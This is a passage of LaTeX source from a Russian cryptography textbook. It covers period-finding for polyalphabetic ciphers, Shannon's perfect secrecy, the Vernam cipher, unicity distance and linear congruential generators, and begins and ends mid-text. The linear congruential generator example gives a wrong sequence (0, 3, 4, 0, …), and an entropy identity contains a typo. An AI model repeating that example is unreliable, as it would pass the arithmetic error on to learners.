ччшймщ чзшг ейнфтз}
\end{quote}

Теперь проведём криптоанализ, используя метод Касиски. Предварительно подсчитаем число появлений каждой буквы в шифротексте. Эти данные приведём в таблице, где $i$ в первой строке означает букву алфавита, а $f_{i}$ во второй строке -- это число появлений этой буквы в шифротексте. Всего в нашем шифротексте имеется $L=1036$ букв.

\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|c||c|c|c|c|c|c|c|c|c|c|c|c|c|c|c|c|}
    \hline
    $i$     & А & Б & В & Г & Д & Е & Ж & З & И & Й & К & Л & М & Н & О & П \\
    $f_{i}$ & 26 & 15 & 11 & 21 & 20 & 36 & 42 & 31 & 13 & 56 & 23 & 70 & 10 & 33 & 36 & 25 \\
    \hline
\end{tabular} } \end{center}

\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|c||c|c|c|c|c|c|c|c|c|c|c|c|c|c|c|c|}
    \hline
    $i$     & Р & С & Т & У & Ф & Х & Ц & Ч & Ш & Щ & Ъ & Ы & Ь & Э & Ю & Я \\
    $f_{i}$ & 28 & 54 & 15 & 36 & 45 & 32 & 31 & 57 & 35 & 72 & 32 & 35 & 27 & 11 & 30 & 28 \\
    \hline
\end{tabular} } \end{center}

В рассматриваемом примере проведённый анализ показал следующее.
\begin{itemize}
    \item Сегмент СЪС встречается в позициях $1, 373, 417, 613$. Соответствующие расстояния равны
        \[ \begin{array}{l}
            373 - 1 = 372 = 4 \cdot 3 \cdot 31, \\
            417 - 373= 44 = 4 \cdot 11, \\
            613 - 417 = 196 = 4 \cdot 49. \\
        \end{array} \]
        Наибольший общий делитель равен $4$. Делаем вывод, что период кратен $4$.
    \item Сегмент ЩГЖ встречается в позициях $5, 781, 941$. Соответствующие расстояния равны
        \[ \begin{array}{l}
            781 - 5 = 776 = 8 \cdot 97, \\
            941 - 781 = 160 = 32 \cdot 5. \\
        \end{array} \]
        Делаем вывод, что период кратен $8$, что не противоречит выводу для предыдущих сегментов (кратность $4$).
    \item Сегмент ЫРО встречается в позициях $13, 349, 557$. Соответствующие расстояния равны
        \[ \begin{array}{l}
            349 - 13 = 336 = 16 \cdot 3 \cdot 7, \\
            557 - 349 = 208 = 16 \cdot 13. \\
        \end{array} \]
        Делаем вывод, что период кратен 4.
\end{itemize}

Предположение о том, что период $n=4$, оказалось правильным.
\exampleend


\subsection{Автокорреляционный метод}

Автокорреляционный метод состоит в том, что исходный шифротекст $C_{1},C_{2}, \ldots, C_{L}$ выписывается в строку, а под ней выписываются строки, полученные сдвигом вправо на $t =1, 2, 3, \ldots$ позиций. Для каждого $t$ подсчитывается число $n_{t}$ индексов $i \in \left[ {1,L - t} \right]$ таких, что $C_i  = C_{i + t}$.

Вычисляются автокорреляционные коэффициенты:
    \[ \gamma_t  = \frac{n_t}{L - t}. \]
Для сдвигов $t$, кратных периоду, коэффициенты должны быть заметно больше, чем для $t$, не кратных периоду.

\example
Для рассматриваемой криптограммы выделим те значения $t$, для которых $\gamma _t~>~0,05.$ Получим ряд чисел:

\begin{quote}
    \noindent \texttt{4, 12, 16, 24, 28, 32, 36, 40, 44, 48, 52, 56, 64, 68, 72, 76, 80, 84, 88, 92, 96, 104, 108, 112, 116, 124, 128, 132, 140, 148, 152, 156, 160, 164, 168, 172, 176, 180, 184, 188, 192, 196, 200, 204, 208, 216, 220, 224, 228, 252, 256, 260, 264, 268, 272, 276, 280, 284, 288, 292, 296, 300, 304, 308, 312, 316, 320, 324, 328, 344, 348, 356, 364, 368, 372, 376, 380, 384, 388, 396, 400, 404, 408, 412, 420, 424, 432, 436, 440, 448, 452, 456, 460, 462, 468, 472, 476, 480, 484, 496, 500, 508, 512, 516.}
\end{quote}

Все эти числа, кроме 462, делятся на 4. Выбираем значение $n=4$, которое верно и совпадает со значением, полученным по методу Касиски.
\exampleend


\subsection{Метод индекса совпадений}

Метод индекса совпадений был описан Фридманом в 1922 году (\langen{William Frederick Friedman}, 1891--1969, \cite{Friedman:1922}). При применении метода индекса совпадений подсчитывают число появлений букв в случайной последовательности
    \[ \mathbf{X} = (X_1 ,X_2 , \ldots , X_L ) \]
и вычисляют вероятность того, что два случайных элемента этой последовательности совпадают. Эта величина называется \textbf{индексом совпадений} и обозначается $I_{c}(\mathbf{x}),$ где
    \[ I_{c} (\mathbf{x}) = \frac{{\sum\limits_{i = 1}^A {f_i (f_i  - 1)} }} {{L(L - 1)}}, \]
$f_{i}$ -- число появлений буквы $i$ в последовательности $\mathbf{x}$, $A$ -- число букв в алфавите.

Значение этого индекса используется в криптоанализе полиалфавитных шифров для приближённого определения периода по формуле
    \[ m \approx \frac{{k_p  - k_r }} {{I_{c} (\mathbf{x}) - k_r  + \frac{{k_p  - I_{c} (\mathbf{x})}} {L}}}, \]
где
    \[ k_r  = \frac{1}{A}, ~~ k_p  = \sum\limits_{i=1}^A p_i^2, \]
$p_i $ -- частота появления буквы $i$ в естественном языке.
Теоретическое обоснование метода индекса совпадений не является простым. Оно приведено в Приложении~\ref{chap:coincide-index} к данному пособию.

\example
В рассматриваемом выше примере приведены значения $f_{i}$. Для русского языка
    \[ A=32, ~ k_{r} = \frac{1}{32} \approx 0.03125, ~ k_{p} \approx 0.0529. \]
Проведя вычисления, получаем $m \approx 3.376$. Полученное по формуле приближённое значение m достаточно близкое к значению периода $n=4$.
\exampleend

С развитием ЭВМ многие классические полиалфавитные шифры перестали быть устойчивыми к криптоатакам.


\chapter{Совершенная криптостойкость}\index{криптостойкость!совершенная|(}
\selectlanguage{russian}

Рассмотрим модель криптосистемы, в которой Алиса выступает источником сообщений $m \in \group{M}$. Алиса использует некоторую функцию шифрования, результатом вычисления которой является шифротекст $c \in \group{C}$:

	\[c = E_{K_1}\left(m\right).\]

Шифротекст $c$ передаётся по открытому каналу легальному пользователю Бобу, причём по пути он может быть перехвачен нелегальным пользователем (криптоаналитиком) Евой.

Боб, обладая ключом расшифрования $K_2$, расшифровывает сообщение с использованием функции расшифрования:
	\[m' = D_{K_2}\left(c \right).\]

Рассмотрим теперь исходное сообщение, передаваемый шифротекст и ключи шифрования (и расшифрования, если они отличаются) в качестве случайных величин, описывая их свойства с точки зрения теории информации. Далее полагаем, что в криптосистеме ключи шифрования и расшифрования совпадают.

Будем называть криптосистему \emph{корректной}, если она обладает следующими свойствами.
\begin{itemize}
	\item Легальный пользователь имеет возможность однозначно восстановить исходное сообщение, то есть
					\[H \left( M | C, K \right) = 0, \]
					\[m' = m.\]
	\item Выбор ключа шифрования не зависит от исходного сообщения
					\[ I \left( K ; M \right) = 0, \]
					\[ H \left( K | M \right) = H \left( K \right). \]
\end{itemize}

Второе свойство является в некотором виде условием на возможность отделить ключ шифрования от данных и алгоритма шифрования.

\section[Определения]{Определения совершенной криптостойкости}

Понятие совершенной секретности (или стойкости) введено американским учёным Клодом Шенноном. В конце Второй мировой войны он закончил работу, посвящённую теории связи в секретных системах\cite{Shannon:1949:CTS}. Эта работа вошла составной частью в собрание его трудов, вышедшее в русском переводе в 1963 году.~\cite{Shannon:1963} Понятие о стойкости шифров по Шеннону связано с решением задачи криптоанализа по одной криптограмме.

Криптосистемы совершенной стойкости могут применяться как в современных вычислительных сетях, так и для шифрования любой бумажной корреспонденции. Основной проблемой применения данных шифров для шифрования больших объёмов информации является необходимость распространения ключей объёмом не меньшим, чем передаваемые сообщения.

\begin{definition}\label{perfect_by_probabilities}
Будем называть криптосистему \emph{совершенно криптостойкой}, если апостериорное распределение вероятностей исходного случайного сообщения $m_i \in \group{M}$ при регистрации случайного шифротекста $c_k \in \group{C}$ совпадает с априорным распределением~\cite{Gultyaeva:2010}:

	\[\forall m_j \in \group{M}, c_k \in \group{C}: P \left( m = m_j | c = c_k \right) = P \left( m = m_j \right).\]
\end{definition}

Данное условие можно переформулировать в терминах статистических свойств сообщения, ключа и шифротекста как случайных величин.

\begin{definition}\label{perfect_by_enthropy}
Будем называть криптосистему \emph{совершенно криптостойкой}, если условная энтропия сообщения\index{энтропия!условная}\index{энтропия!открытого текста} при известном шифротексте равна безусловной:
	\[H \left( M | C \right) = H \left( M \right),\]
	\[I \left( M; C \right) = 0.\]
\end{definition}

Можно показать, что определения~\ref{perfect_by_probabilities} и~\ref{perfect_by_enthropy} тождественны.

\section[Условие]{Условие совершенной криптостойкости}

Найдём оценку количества информации, которое содержит шифротекст $C$ относительно сообщения $M$:
\[ I(M; C) = H(M) - H(M | C). \]
Очевидны следующие соотношения условных и безусловных энтропий~\cite{GabPil:2007}:
\[H(K|C)=H(K|C)+H(M|KC)=H(MK|C),\]
\[H(M,K|C)=H(M|C)+H(K|M,C)\geq H(M|C),\]
\[H(K)\geq H(K|C)\geq H(M|C).\]
Отсюда получаем:
 \[ I(M; C) = H(M) - H(M | C)\geq H(M)-H(K). \]
Из последнего неравенства следует, что взаимная информация между сообщением и шифротекстом равна нулю, если энтропия ключа не меньше энтропии сообщений. С другой стороны, взаимная информация между сообщением и шифротекстом равна нулю, если они статистически независимы. Таким образом, условием совершенной криптостойкости является неравенство:
\[ H(M) \leq H(K).\]
%Если утверждение верно, то количество информации в шифротексте относительно открытого текста $I(M; C)$ равно нулю:
%  \[ I(M; C) = H(M) - H(M | C) = 0, \]
%так как для статистически независимых величин условная энтропия равна безусловной энтропии, то есть $H(M) = H(M | C)$.

%Функцию шифрования обозначим $E: \{ M, K \} \rightarrow C$. Процедура шифрования состоит из следующих шагов.
%\begin{itemize}
%    \item Легальный пользователь $A$ выбирает ключ $k \in K$ и секретно сообщает его легальному пользователю $B$ (дополнительная задача -- распределение ключей).
%    \item По открытому сообщению $m \in M$ и выбранному ключу $k$ вычисляют шифрованное сообщение $c = E_k(m) \in C$.
%\end{itemize}

%Основное требование при шифровании состоит в том, чтобы при выбранном ключе $k$ вычисление $c$ было лёгкой задачей для любого сообщения $m$.

%Функцию расшифрования обозначим $D: \{ C, K \} \rightarrow M$. Процедура расшифрования состоит из следующих шагов.
%\begin{itemize}
%    \item Легальный пользователь $B$ получает от $A$ секретный ключ $k \in K$.
 %   \item $B$ по принятому шифрованному сообщению $c \in C$ и известному ключу $k$ вычисляет открытое сообщение $m = D_k(c) \in M$.
%\end{itemize}

%Основное требование: при выбранном ключе $k$ вычисление $m$ должно быть лёгкой задачей для любого $c$. С другой стороны, при неизвестном ключе $k$ вычисление открытого сообщения $m$ по известному шифрованному сообщению $c$ должно быть трудной задачей для любого $c$.

%Криптостойкость шифра оценивается числом операций, необходимым для определения: открытого текста $m$ по шифротексту $c$, либо ключа шифрования $k$ по открытому тексту $m$ и шифротексту $c$.

%$M, C, K$ интерпретируются как случайные величины.
%Пусть заданы распределения вероятностей $P_m(M), P_c(C), P_k(K)$. По определению шифрование $C = E_K(M)$ -- детерминированная функция своих аргументов.
%Если при выбранном шифре оказалось, что открытый текст $M$ и шифротекст $C$ -- статистически независимые случайные величины, то считается, что такая система обладает совершенной криптостойкостью.


%\subsection{Длина ключа}

%Пусть сообщения $m\in M$ и ключи $r\in K$ являются независимыми случайными величинами. Это значит, что их совместная вероятность $P_{mk}(M, K)$ равна произведению отдельных вероятностей:
%\[P_{mk}(M, K) = P_m(M) \cdot P_k(K).\]
%Пусть $C = E_K(M)$ -- множество шифрованных текстов, $M = D_K(C)$ -- множество расшифрованных текстов. Можно найти вероятности $P_c(C), P_{mck}(M,C,K)$.

%Используя известные соотношения о безусловной и условной энтропии~\cite{GabPil:2007}, оценим энтропию открытых текстов $M$ с учётом статистической независимости $M$ и $C$:
 %   \[ H(M) = H(M | C) \leq H(MK | C) = H(K | C) + H(M | CK) = \]     \[ = H(K | C) \leq H(K). \]

%Так как энтропия открытого текста при заданном шифротексте и известном ключе равна нулю, то $H(M|CK)=0$. В результате получаем     \[ H(M) \leq H(K). \]

Обозначим длины сообщений и ключа как $L(M)$ и $L(K)$ соответственно. Известно, что $H(M) \leq L(M)$~\cite{GabPil:2007}. Равенство $H(M) = L(M)$ достигается, когда сообщения состоят из статистически независимых и равновероятных символов. Такое же свойство выполняется и для случайных ключей $H(K) \leq L(K)$. Таким образом, достаточным условием совершенной криптостойкости системы можно считать неравенство
 \[ L(M) \leq L(K)\]
при случайном выборе ключа.

%С другой стороны, энтропия открытого текста $H(M)$ характеризует длину последовательности для описания случайной величины $M$ (открытого сообщения), а $H(K)$ характеризует длину последовательности для описания ключа. Следовательно, совершенная криптостойкость возможна только тогда, когда длина ключа не меньше, чем длина шифруемого сообщения, то есть
%\[
%H(M) \leq H(K).
%\]
%Как правило, длина сообщения заранее неизвестна и ограничена большим числом. Выбрать ключ длины не меньшей, чем возможное сообщение не представляется возможным или рациональным, и один и тот же ключ (или его преобразования) используется многократно для шифрования блоков сообщения фиксированной длины. То есть, $H(K) \ll H(M)$.

На самом деле, сообщение может иметь произвольную (заранее не ограниченную) длину. Поэтому генерация и главным образом доставка легальным пользователям случайного и достаточно длинного ключа становятся критическими проблемами. Практическим решением этих проблем является многократное использование одного и того же ключа при условии, что его длина гарантирует вычислительную невозможность любой известной атаки на подбор ключа.

\index{криптостойкость!совершенная|)}

\section{Криптосистема Вернама}\index{криптосистема!Вернама|(}

Приведём пример системы с совершенной криптостойкостью.

Пусть сообщение представлено двоичной последовательностью длины $N$:
    \[ m = (m_1, m_2, \dots, m_N). \]
Распределение вероятностей сообщений $P_m(m)$ может быть любым. Ключ также представлен двоичной последовательностью $ k = (k_1, k_2, \dots, k_N)$ той же длины, но с равномерным распределением
    \[ P_k(k) = \frac{1}{2^N} \]
для всех ключей.

Шифрование в криптосистеме Вернама осуществляется путём покомпонентного суммирования по модулю алфавита последовательностей открытого текста и ключа:
    \[ C = M \oplus K = (m_1 \oplus k_1, ~ m_2 \oplus k_2, \dots, m_N \oplus k_N). \]

Легальный пользователь знает ключ и осуществляет расшифрование:
    \[ M =C \oplus K = (m_1 \oplus k_1, ~ m_2 \oplus k_2, \dots, m_N \oplus k_N). \]

Найдём вероятностное распределение $N$-блоков шифротекстов, используя формулу
    \[ P(c = a) = P(m \oplus k = a) = \sum_{m} P(m) P(m \oplus k = a | m) = \]
    \[ = \sum_{m} P(m) P(k \oplus m) = \sum_{m} P(m) \frac{1}{2^N} = \frac{1}{2^N}. \]

Получили подтверждение известного факта: сумма двух случайных величин, одна из которых имеет равномерное распределение, является случайной величиной с равномерным распределением. В нашем случае распределение ключей равномерное, поэтому распределение шифротекстов тоже равномерное.

Запишем совместное распределение открытых текстов и шифротекстов:
    \[ P(m = a, c = b) ~=~ P(m = a) ~ P(c = b | m = a). \]

Найдём условное распределение:
    \[ P(c = b | m = a) ~=~ P(m \oplus k = b | m = a) ~= \]
    \[ =~ P(k = b \oplus a | m = a) ~=~ P(k = b \oplus a) ~=~ \frac{1}{2^N}, \]
так как ключ и открытый текст являются независимыми случайными величинами. Итого:
    \[ P(c=b | m=a) = \frac{1}{2^N}. \]

Подстановка правой части этой формулы в формулу для совместного распределения даёт
    \[ P(m=a,c=b)=P(m=a)\frac{1}{2^N}, \]
что доказывает независимость шифротекстов и открытых текстов в этой системе. По доказанному выше, количество информации в шифротексте относительно открытого текста равно нулю. Это значит, что рассмотренная криптосистема Вернама обладает совершенной секретностью (криптостойкостью) при условии, что для каждого $N$-блока (сообщения) генерируется случайный (одноразовый) $N$-ключ.

\index{криптосистема!Вернама|)}

\section{Расстояние единственности}\label{section_unicity_distance}\index{расстояние единственности}
\selectlanguage{russian}
\index{расстояние единственности}

Использование ключей с длиной, сопоставимой с размером текста, имеет смысл только в очень редких случаях, когда есть возможность предварительно обменяться ключевой информацией большого объёма, много большего, чем планируемый объём передаваемой информации. Но в большинстве случаев использование абсолютно надёжных систем оказывается неэффективным как с экономической, так и с практической точек зрения. Если двум сторонам нужно постоянно обмениваться большим объёмом информации, и они смогли найти надёжный канал для передачи ключа, то ничего не мешает воспользоваться этим же каналом для передачи самой информации сопоставимого объёма.

В подавляющем большинстве криптосистем размер ключа много меньше размера открытого текста, который нужно передать. Попробуем оценить теоретическую надёжность подобных систем, исходя из статистических теоретико-информационных соображений.

В реальной ситуации длина ключа может быть много меньше длины открытого текста, поскольку передача ключа при больших объёмах текста будет затруднена большим объёмом ключа. Это означает, что энтропия ключа\index{энтропия!ключа} может быть много меньше энтропии открытого текста\index{энтропия!открытого текста}: $H(K) \ll H(M)$. Для таких ситуаций важным понятием является \textbf{расстояние единственности}\index{расстояние единственности}, впервые предложенное в работах Клода Шеннона~\cite{Golomb:2002, Schneier:2011}.

\begin{definition}\label{definition:unicity_distance}
\textbf{Расстоянием единственности}\index{расстояние единственности} называется количество символов шифротекста, которое необходимо для однозначного восстановления открытого текста.
\end{definition}

Пусть зашифрованное сообщение (шифротекст) $C$ состоит из $N$ символов $L$-буквенного алфавита:
	\[C = (C_1, C_2, \dots, C_N).\]

Определим функцию $h(n)$ как условную энтропию\index{энтропия!условная} ключа при перехвате криптоаналитиком $n$ символов шифротекста:
\[ \begin{array}{l}
    h ( 0 ) = H(K), \\
    h ( 1 ) = H(K | C_1), \\
    h ( 2 ) = H(K | C_1 C_2), \\
    \dots \\
    h ( n ) = H(K | C_1 C_2 \dots C_n), \\
    \dots
\end{array} \]

Функция $h(n)$ называется \emph{функцией неопределённости ключа}\index{функция!неопределённости ключа}. Она является невозрастающей функцией числа перехваченных символов $n$. Если для некоторого значения $n_u$ окажется, что $h ( n_u ) = 0$, то это будет означать, что ключ $K$ является детерминированной функцией первых $n_u$ символов шифротекста $C_1, C_2, \dots, C_{n_u}$, и при неограниченных вычислительных возможностях используемый ключ $K$ может быть определён. Число $n_u$ и будет являться \emph{расстоянием единственности}. Полученное $n_u$ соответствует определению~\ref{definition:unicity_distance}, так как для корректной криптосистемы однозначное определение ключа также означает и возможность получить открытый текст однозначным способом.

Найдём типичное поведение функции $h(n)$ и значение расстояния единственности $n_u$. Используем следующие предположения.
\begin{itemize}
    \item Криптограф всегда стремится спроектировать систему таким образом, чтобы символы шифрованного текста имели равномерное распределение и, следовательно, энтропия шифротекста\index{энтропия!шифротекста} имела максимальное значение:
            \[ H(C_1 C_2 \dots C_n) \approx n \log_2 L, ~ n = 1, 2, \dots, N. \]
    \item Имеет место соотношение
            \[ H(C | K) = H(C_1 C_2 \dots C_N | K)  =  H(M), \]
        которое следует из цепочки равенств
            \[ H(MCK) = H(M) + H(K | M) + H(C | MK) = H(M) + H(K), \]
        так как
            \[ H(K | M) = H(K), ~~ H(C | MK) = 0, \]
            \[H(MCK) = H(K) + H(C | K) + H(M | CK) = H(K) + H(C | K), \]
        поскольку
            \[ H(M | CK) = 0. \]
    \item Предполагается, что для любого $n \le N$ приближённо выполняется соотношение
        \[ H(C_n | K) \approx \frac{1}{N} H(M), \]
        \[ H(C_1 C_2\dots C_n | K) \approx \frac{n}{N} H(M). \]
\end{itemize}

Вычислим энтропию $H(C_1 C_2 \dots C_n ; K)$ двумя способами:
    \[ H( C_1 C_2 \dots C_n ; K ) = H(C_1 C_2 \dots C_n) + H(K | C_1 C_2 \dots C_n) \approx \]
        \[ \approx n \log_2 L + h(n), \]
    \[ H( C_1 C_2 \dots C_n ; K ) = H(K) + H(C_1 C_2 \dots C_n | K) \approx \]
        \[ \approx H(K) + \frac{n}{N} H(M). \]

Отсюда следует, что
    \[ h(n) \approx H(K) + n \left( \frac{H(M)}{N} - \log_2 L \right) \]
и
    \[ n_u = \frac{H(K)}{ \left( 1 - \frac{H(M)}{N \log_2 L} \right) \log_2 L} = \frac{H(K)}{\rho \log_2 L}. \]
Здесь
    \[ \rho = 1 - \frac{H(M)}{N \log_2 L} \]
означает избыточность источника открытых текстов\index{избыточность!открытого текста}.

Если избыточность источника измеряется в битах на символ, а ключ шифрования выбирается случайным образом из всего множества ключей $\{0, 1\}^{l_K}$, где $l_K$ -- длина ключа в битах, то расстояние единственности $n$ тоже получается в битах, и формула значительно упрощается:

\begin{equation}\label{eq:unicity_distance_simple_frac}
n_u \approx \frac{l_K}{\rho}.
\end{equation}

Взяв нижнюю границу $H(M)$ энтропии\index{энтропия!открытого текста} одного символа английского текста как $1{,}3$ бит/символ~\cite{Shannon:1951, Schneier:2002}, получим:

	\[ \rho _{en} \approx 1 - \frac{ 1{,}3 }{ \log _2 {26} } \approx 0{,}72.\]

Для русского текста с энтропией $H(M)$, примерно равной $3{,}01$ бит/символ~\cite{Lebedev:1958}\footnote{Следует отметить, что для английского текста значение $1{,}3$ представляет собой суммарную оценку для всего текста, в то время как оценка $3{,}01$ для русского текста получена Лебедевым и Гармашем из анализа \textbf{частот трёхбуквенных сочетаний} в отрывке текста Л. Н. Толстого <<Война и мир>> длиной в 30 тыс. символов. Соответствующая оценка для английского текста, также приведённая в работе Шеннона, примерно равна $3{,}0$.}, получаем:

	\[ \rho _{ru} \approx 1 - \frac{ 3{,}0 }{ \log _2 {32} } \approx 0{,}40.\]

Однако если предположить, что текст передаётся в формате простого текстового файла (\langen{plain text}) в стандартной кодировке UTF-8 (один байт на английский символ и два ~--- на кириллицу), то значения избыточности становятся примерно равны $0{,}83$ для английского и $0{,}81$ для русского языков:

	\[ \rho _{en, UTF-8} \approx 1 - \frac{ 1{,}3 }{ \log _2 {2^{8}} } \approx 0{,}83,\]
	\[ \rho _{ru, UTF-8} \approx 1 - \frac{ 3{,}0 }{ \log _2 {2^{16}} } \approx 0{,}81.\]

Подставляя полученные числа в выражение~\ref{eq:unicity_distance_simple_frac} для шифров DES\index{шифр!DES} и AES\index{шифр!AES}, получаем таблицу~\ref{table:unicity_distances}.

\begin{table}[!ht]
	\centering
		\begin{tabular}{|| l | r | r ||}
			\hline
			\hline
			\text{Блочный шифр} & \text{Английский текст} & \text{Русский текст} \\
			\hline
			\hline
			\text{Шифр DES\index{шифр!DES},} & \text{ $\approx~67$ бит;} & \text{$\approx~69$ бит;} \\
			\text{ключ 56 бит} & \text{ 2 блока данных} & \text{2 блока данных} \\
			\hline
			\text{Шифр AES\index{шифр!AES},} & \text{ $\approx~153$ бит;} & \text{$\approx~158$ бит;} \\
			\text{ключ 128 бит} & \text{ 3 блока данных} & \text{3 блока данных} \\
			\hline
			\hline
		\end{tabular}
  \caption{Расстояния единственности для шифров DES\index{шифр!DES} и AES\index{шифр!AES} для английского и русского текстов в формате простого текстового файла и кодировке UTF-8}
	\label{table:unicity_distances}
\end{table}

Полученные данные с теоретической точки зрения означают, что, когда криптоаналитик будет подбирать ключ к зашифрованным данным, трёх блоков данных ему будет достаточно, чтобы сделать вывод о правильности выбора ключа расшифрования и корректности дешифровки, если известно, что в качестве открытого текста выступает простой текстовый файл. Если открытым текстом является случайный набор данных, то криптоаналитик не сможет отличить правильно расшифрованный набор данных от неправильного, и расстояние единственности, в соответствии с выводами выше (для нулевой избыточности источника), оказывается равным бесконечности.

Улучшить ситуацию для легального пользователя помогает предварительное сжатие открытого текста с помощью алгоритмов архивации, что уменьшает его избыточность\index{избыточность!открытого текста} (а также уменьшает размер и ускоряет процесс шифрования в целом). Однако расстояние единственности не становится бесконечным, так как в результате работы алгоритмов архивации присутствуют различные константные сигнатуры, а для многих текстов можно заранее предсказать примерные словари сжатия, которые будут записаны как часть открытого текста. Более того, используемые на практике программы безопасной передачи данных вынуждены, так или иначе, встраивать механизмы хотя бы частичной быстрой проверки правильности ключа расшифрования (например, добавлением известной сигнатуры в начало открытого текста). Делается это для того, чтобы сообщить легальному получателю об ошибке ввода ключа, если такая ошибка случится.

Соображения выше показывают, что для одного ключа расшифрования, так или иначе, процедура проверки его корректности является быстрой. Чтобы значительно усложнить работу криптоаналитику, множество ключей, которые требуется перебрать, должно быть большой величиной (например, от $2^{80}$). Это можно сделать, во-первых, увеличением битовой длины ключа, во-вторых, аккуратной разработкой алгоритма шифрования, чтобы криптоаналитик не смог <<отбросить>> часть ключей без их полной проверки.

Несмотря на то, что теоретический вывод о совершенной криптостойкости для практики неприемлем, так как требует большого объёма ключа, сравнимого с объёмом открытого текста, разработанные идеи находят успешное применение в современных криптосистемах. Вытекающий из идей Шеннона принцип выравнивания апостериорного распределения символов в шифротекстах используется в современных криптосистемах с помощью многократных итераций (раундов), включающих замены и перестановки.



\subimport*{block-ciphers/}{index}

\chapter{Генераторы псевдослучайных чисел}\label{chapter-generators}
\selectlanguage{russian}

Для работы многих криптографических примитивов необходимо уметь получать случайные числа:
\begin{itemize}
	\item вектор инициализации для отдельных режимов сцепления блоков должен быть случайным числом (см. раздел~\ref{section-block-chaining});
	\item для генерации пар открытых и закрытых ключей необходимы случайные числа (см. главу~\ref{chapter-public-key});
	\item стойкость многих протоколов распределения ключей (см. главу~\ref{chapter-key-distribution-protocols}) основывается в том числе на выработке случайных чисел (\langen{nonce}), которые не может предугадать злоумышленник.
\end{itemize}

Генератором случайных чисел (\langen{random number generator})\index{генератор!случайных чисел} мы будем называть процесс\footnote{Есть и строгое математическое определение генератора в общем смысле. Генератором называется функция $g: \left\{0, 1\right\}^{n} \to \left\{0, 1\right\}^{q\left(n\right)}$, вычислимая за полиномиальное время. Однако мы пока не будем использовать это определение, чтобы показать разницу между истинно случайными числами и псевдослучайными.}, результатом работы которого является случайная последовательность чисел, а именно такая, что зная произвольное число предыдущих чисел последовательности (и способ их получения), даже теоретически нельзя предсказать следующее с вероятностью больше заданной. К таким случайным процессам можно отнести:

\begin{itemize}
	\item результат работы счётчика элементарных частиц, работа с которым включена в лабораторный практикум по общей физике для студентов первого курса МФТИ;
	\item время между нажатиями клавиш на клавиатуре персонального компьютера или расстояние, которое проходит <<мышь>> во время движения;
	\item время между двумя пакетами, полученными сетевой картой;
	\item тепловой шум, измеряемый звуковой картой на входе аналогового микрофона, даже в отсутствии самого микрофона.
\end{itemize}

Хотя для всех этих процессов можно предсказать приблизительное значение, его последний бит (чётное или нечётное) будет оставаться достаточно случайным для практических целей. С учётом данной поправки их можно называть надёжными или качественными генераторами случайных чисел.

Однако к генератору случайных чисел предъявляются и другие требования. Кроме уже указанного критерия \emph{качественности} или \emph{надёжности}, генератор должен быть \emph{быстрым} и \emph{дешёвым}. Быстрым -- чтобы получить большой объём случайной информации за заданный период времени. И дешёвым -- чтобы его можно было бы использовать на практике. Количество случайной информации от перечисленных выше генераторов составляет не более десятков килобайт в секунду (для теплового шума), и значительно меньше, если мы будем требовать ещё и равномерность распределения полученных случайных чисел.

С целью получения большего объёма случайной информации используют специальные алгоритмы, которые называют генераторами псевдослучайных чисел (ГПСЧ). ГПСЧ -- это детерминированный алгоритм, выходом которого является последовательность чисел, обладающая свойством случайности. Работу ГПСЧ можно описать следующей моделью. На подготовительном этапе оперативная память, используемая алгоритмом, заполняется начальным значением (\langen{seed}). Далее на каждой итерации своей работы ГПСЧ выдаёт на выход число, которое является функцией от состояния оперативной памяти алгоритма и меняет содержимое своей памяти по определённым правилам. Содержимое оперативной памяти называется \emph{внутренним состоянием} генератора.

Как и у любого алгоритма, у ГПСЧ есть определённый размер используемой оперативной памяти\footnote{Только алгоритмы с фиксированным размером используемой оперативной памяти и можно называть \emph{генераторами} в строгом математическом смысле этого слова, как следует из определения.}. Исходя из практических требований, предполагается, что размер оперативной памяти для ГПСЧ сильно ограничен. Так как память алгоритма ограничена, то ограничено и число различных внутренних состояний алгоритма. Так как выдаваемые ГПСЧ числа являются функцией от внутреннего состояния, то любой ГПСЧ, работающий с ограниченным размером оперативной памяти и не принимающий извне дополнительной информации, будет иметь \emph{период}. Для генератора с памятью в $n$ бит максимальный период, очевидно, равен $2^n$.

Качество детерминированного алгоритма, то есть то, насколько полученная последовательность обладает свойством случайной, можно оценить с помощью тестов, таких как набор тестов NIST (\langen{National Institute of Standards and Technology}, США,~\cite{NIST:2001}). Данный набор содержит большое число различных проверок, включая частотные тесты бит и блоков, тесты максимальных последовательностей в блоке, тесты матриц и так далее.

\section{Линейный конгруэнтный генератор}\label{section-linear-congruential-generator}\index{генератор!линейный конгруэнтный}
\selectlanguage{russian}

Алгоритм был предложен Лемером (\langen{Derrick Henry Lehmer},~\cite{Lehmer:1951:1, Lehmer:1951:2}) в 1949 году. Линейный конгруэнтный генератор основывается на вычислении последовательности $x_n, x_{n+1}, \dots$, такой что:
	\[x_{n+1} = a \cdot x_n + c \mod m.\]

Числа $a, c, m$, $ 0 < a < m, 0 < c < m$ являются параметрами алгоритма.

\example
Для параметров $a = 2, c = 3, m = 5$ и начального состояния $x_0 = 1$ получаем последовательность: $0, 3, 4, 0, 3, 4, \dots$
\exampleend

Максимальный период ограничен значением $m$. Но максимум периода достигается тогда и только тогда, когда~\cite[Линейный конгруэнтный метод]{Knuth:2001:2}:

\begin{itemize}
	\item числа $c$ и $m$ взаимно просты\index{числа!взаимно простые};
	\item число $a - 1$ кратно каждому простому делителю числа $m$;
	\item число $a - 1$ кратно 4, если $m$ кратно 4.
\end{itemize}

Конкретная реализация алгоритма может использовать в качестве выхода либо внутреннее состояние целиком (число $x_n$), либо его отдельные биты. Линейный конгруэнтный генератор является простым (то есть <<дешёвым>>) и быстрым генератором, результатом его работы является статистически качественная псевдослучайная последовательность. Линейный конгруэнтный генератор нашёл широкое применение в качестве стандартной реализации функции \texttt{random} в различных компиляторах и библиотеках времени исполнения (см. таблицу~\ref{table:lcg}). Но, забегая вперёд, стоит отметить, что его использование в криптографии недопустимо. Зная два последовательных значения выхода генератора ($x_n$ и $x_{n+1}$) и единственный параметр схемы $m$, можно решить систему уравнений и найти $a$ и $c$, чего будет достаточно для нахождения всей дальнейшей (или предыдущей) части последовательности. Параметр $m$, в свою очередь, можно найти перебором, начиная с некоторого $\min(X): X \geq x_i$, где $x_i$ -- наблюдаемые элементы последовательности.

\begin{landscape}
{\renewcommand{\arraystretch}{1.5}
\begin{table}[h]
\begin{tabular}{|p{0.34\linewidth}|r|r|r|l|}
\hline
									& a		& c		& m		& используемые биты	\\
\hline
